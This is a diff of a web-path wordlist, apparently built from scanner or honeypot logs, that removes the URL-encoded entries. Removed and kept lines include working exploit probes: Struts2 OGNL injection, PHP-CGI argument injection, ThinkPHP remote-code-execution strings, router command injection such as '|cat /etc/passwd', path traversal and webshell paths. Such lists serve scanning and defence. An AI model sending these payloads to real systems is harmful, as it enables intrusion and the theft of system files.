@@ -1,17 +1,3 @@
-%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f
-%62%61%73%65/%70%6F%73%74%2E%70%68%70
-%63%67%69%2D%62%69%6E/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E
-%69%73%70%69%72%69%74/%69%6D/%75%70%6C%6F%61%64%2E%70%68%70
-%73%65%65%79%6F%6E/%68%74%6D%6C%6F%66%66%69%63%65%73%65%72%76%6C%65%74
-%75%73%65%72%2e%70%68%70
-%75%73%65%72/%72%65%67%69%73%74%65%72?%65%6c%65%6d%65%6e%74%5f%70%61%72%65%6e%74%73=%74%69%6d%65%7a%6f%6e%65%2f%74%69%6d%65%7a%6f%6e%65%2f%23%76%61%6c%75%65&%61%6a%61%78%5f%66%6f%72%6d=1&%5f%77%72%61%70%70%65%72%5f%66%6f%72%6d%61%74=%64%72%75%70%61%6c%5f%61%6a%61%78
-%E5%BC%80%E5%A5%96%E5%99%A8/config.js
-%E5%BC%80%E5%A5%96%E5%99%A8/kaijiang/config.js
-%E5%BC%80%E5%A5%96%E5%99%A8/kj/config.js
-%E5%BC%80%E5%A5%96%E5%99%A8/nxkj2015/config.js
-%E5%BC%80%E5%A5%96%E6%96%87%E4%BB%B6/config.js
-%E5%BC%80%E5%A5%96%E7%A8%8B%E5%BA%8F/config.js
-%E9%87%87%E9%9B%86/config.js
 *
 ../../../../../etc/passwd
 ../../../../../mnt/mtd/Config/Account1
@@ -53,7 +39,6 @@
 1/wp-includes/wlwmanifest.xml
 11
 11.txt
-123%E5%BC%80%E5%A5%96%E5%99%A8/config.js
 123131/index.php
 12f592fb181d007c7b1b733b23c5428e.php
 1c116b632d90c292a0f2939009647f76.php
@@ -95,13 +80,11 @@
 9678.php
 99.php
 9C7514000000.cfg
-?a=echo%20-n%20HelloNginx%7Cmd5sum
 ?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>
 ?author=1
 ?author=2
 ?c=whoami&ppp=whoami
 ?CAVIT
-?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest
 ?feed=rss2
 ?XDEBUG_SESSION_START=phpstorm
 ?xxnew2018_url2=2
@@ -131,7 +114,6 @@ action/default/WebLoginBase.class.php
 actuator/env
 adm/scripts/setup.php
 admin
-ADMIN%24
 admin-scripts.asp
 admin.php
 admin/
@@ -139,7 +121,6 @@ admin/Admincenter/Public.login.do
 admin/app/Kjapi/Controller/CaipiaotimesController.class.php
 admin/assets/js/views/login.js
 admin/config.php
-admin/config.php?password%5B0%5D=ZIZO&username=admin
 admin/connection/
 admin/index.php
 admin/login.php
@@ -218,7 +199,6 @@ admintc/login.asp
 admm/scripts/setup.php
 admn/scripts/setup.php
 ads.txt
-adv,/cgi-bin/weblogin.cgi?username=admin%27%3Bls%20%23&password=asdf
 adxyc/Admincenter/Public.login.do
 adyy/Admincenter/Index.index.do
 aecab5fc5d0bdcca959ce9784713aefe.php
@@ -282,10 +262,7 @@ blog/xmlrpc.php
 blogs/wp-includes/wlwmanifest.xml
 boaform/admin/formLogin
 boaform/admin/formPing
-boaform/admin/formPing?target_addr=;'+payload+'%20/&waninf=1_INTERNET_R_VID_154
-boardData102.php?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;echo%206GQNHiRVvYsXRo55eoPwwna7jv5PGpHo;%20echo%20
 bochuan/login.asp
-BOEKJ/%E5%BC%80%E5%A5%96%E5%99%A8/config.js
 BOEKJ/config.js
 BOEKJ/kj/config.js
 BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../../etc/passwd
@@ -311,7 +288,6 @@ cgi-bin
 cgi-bin/auth_if.cgi?Login
 cgi-bin/check.cgi?file=../../../etc/passwd
 cgi-bin/chklogin.cgi?file=../../../etc/passwd
-cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;echo%20$((854625-1));echo%20ffffffffffffffff;
 cgi-bin/mainfunction.cgi
 cgi-bin/nobody/
 cgi-bin/nobody/nobody/loginQuick.htm/cgi-bin/rdfs.cgi
@@ -437,7 +413,6 @@ ef064fddbf0fe62c879b07244ec18236.php
 egsece.pdf
 eims3/assets/bundle/commons.js
 EIMSII/assets/bundle/commons.js
-elrekt.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50
 en/wp-includes/wlwmanifest.xml
 env
 erm/help/how_to_getstarted.html
@@ -479,12 +454,10 @@ ftmabc.php
 ftpsync.settings
 ftpsync.settings.save
 ftpsync.settings~
-FxCodeShell.jsp%20
 FxCodeShell.jsp/
 FxCodeShell.jsp::$DATA
 get_status.cgi
 getcfg.php
-getcfg.php?A=A%0A_POST_SERVICES%3DDEVICE.ACCOUNT%0AAUTHORIZED_GROUP%3D1
 gigaset/
 globe
 goform/enhAuthHandler
@@ -548,7 +521,6 @@ images/stories/cmd.php
 images/stories/filemga.php?ssp=RfVbHu
 images/up.php
 images/vuln.php
-imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini
 imc/reportscript/sqlserver/deploypara.properties
 indea.php
 index.action
@@ -575,7 +547,6 @@ index.php/zuopin/
 index.php?-s
 index.php?m=admin&c=index&a=login&dosubmit=1
 index.php?param1=assert&param2=print(md5(57575848371));
-index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50
 index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP
 index.php?s=/module/action/param1/${@die(md5(HelloThinkPHP))}
 index.php?xxxxxxxxxxxx_loads=true&xxxxxxxxxxxx_filename=tr
@@ -584,13 +555,11 @@ info/SYSTEM/_Application.htm
 install.php
 invoker/readonly
 ipc$
-ipc%24
 ISAPI/Security/userCheck
 izom.php
 java.php
 jc7X
 jdkj2015/config.js
-jf%E5%BC%80%E5%A5%96%E5%99%A8/kj/config.js
 jhadmin/login.asp
 jhlyadmin168/login.asp
 jiankong.htm
@@ -601,7 +570,6 @@ joomla/
 joomla/robots.txt
 jquery/1.2.6/all/jquery.tools.min.js
 jquery/1.4.4/lib/jquery.min.js
-js/common.js%20
 js/guest.js
 js/index.js
 js/Multi_Language.js
@@ -616,16 +584,13 @@ kaijiang/kj/config.js
 kfc_guide.pdf
 khd.html
 kj-yuanban/config.js
-kj/%E6%96%B0%E8%9C%82%E5%BC%80%E5%A5%96%E5%99%A8/config.js
 kj/config.js
 kj/kaijiang/config.js
 kj/kj/config.js
 kj1123/config.js
 kj20150627/config.js
-kj2016(%E9%87%87%E9%9B%86%E5%99%A8)/config.js
 kj2016/config.js
 kj2017/config.js
-kj2018(%E9%87%87%E9%9B%86%E5%99%A8)/config.js
 kj2018/config.js
 kj332235/config.js
 kj88/config.js
@@ -641,7 +606,6 @@ lang.php?f=1
 laravel.php
 lBGg
 level/15/exec/-/sh/run/CR
-level/16/exec/-/show%20startup-config
 lib/classes/googleChart/markers/GoogleChartMapMarker.php
 lib/classes/googleChart/markers/GoogleChartsMarker.php
 lib/classes/googleChart/Thumbs.php
@@ -731,7 +695,6 @@ new/wp-includes/wlwmanifest.xml
 new_license.php
 news/wp-includes/wlwmanifest.xml
 newsite/wp-includes/wlwmanifest.xml
-nice%20ports%2C/Tri%6Eity.txt%2ebak
 nmaplowercheck1589031691
 nmaplowercheck1589275847
 nmaplowercheck1589368762
@@ -820,7 +783,6 @@ phpmyadm1n/index.php
 phpMyadmi/index.php
 phpMyAdmi/scripts/setup.php
 phpmyadmin
-phpMyAdmin!@%23!@%25$%5E&%25%5E%5E%25/
 phpMyAdmin+++---/index.php
 phpMyAdmin-2.10.0.0/scripts/setup.php
 phpMyAdmin-2.10.0.1/scripts/setup.php
@@ -1155,7 +1117,6 @@ phpMydmin/index.php
 phpNyAdmin/index.php
 phppgadmin/scripts/setup.php
 phppma/index.php
-pk10%E5%BC%80%E5%A5%96%E5%99%A8/kkjj/config.js
 play/272/video.m3u8
 plugins/weathermap/editor.php
 pma-old/index.php
@@ -1254,7 +1215,6 @@ sheep.php
 shell.php
 shell?/bin/busybox+ABCD
 shell?busybox
-shell?echo%20BKbFjTIa7HO2ajBz
 shop
 shop/wp-includes/wlwmanifest.xml
 shopdb/index.php
@@ -1494,10 +1454,7 @@ vhcs2/tools/pma/scripts/setup.php
 vicidial/admin.php?ADD=140000000000
 video.htm
 view/index.shtml
-view/IPV6/ipv6networktool/traceroute/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40%7Ccat+/etc/passwd;
-view/systemConfig/systemTool/traceRoute/traceroute.php?text_target=127.0.0.1&text_ageout=2&text_minttl=1&text_maxttl=1%7Ccat+/etc/passwd;
 Views/ueditor/net/controller.ashx
-vlc/mojetv.mp4?token=9kaGdBWu3VhLchNipL3yVm0RA%2F8bHHZCJKgINj69%2BZY4TqY9PVmUx8gUhCbZwqFZp7XRLRlxp0QBIeOBunjUMw%3D%3D
 Vp5a
 VSServices
 vtigercrm/vtigerservice.php
@@ -1651,7 +1608,6 @@ xw.php
 xw1.php
 xx.php
 xxsssseee
-xy_%E5%BC%80%E5%A5%96%E5%99%A8/config.js
 y000000000000.cfg
 ydadmin/login.asp
 yealink/y000000000000.cfg
